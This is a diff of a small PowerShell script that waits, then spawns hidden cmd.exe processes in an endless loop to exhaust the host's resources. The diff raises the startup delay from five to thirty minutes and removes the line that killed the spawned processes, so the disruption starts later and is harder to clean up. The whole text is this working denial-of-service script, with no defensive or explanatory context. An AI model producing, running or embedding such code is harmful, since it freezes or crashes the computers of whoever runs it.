@@ -1,10 +1,9 @@
 # Wait for 5 minutes
-Start-Sleep -Seconds 300
+Start-Sleep -Seconds 1800
 
 # Open infinite CMD terminals
 while($true) {
     Start-Process cmd.exe -WindowStyle Hidden
 }
 
-# Close all CMD terminals
-Stop-Process -Name cmd -Force
+
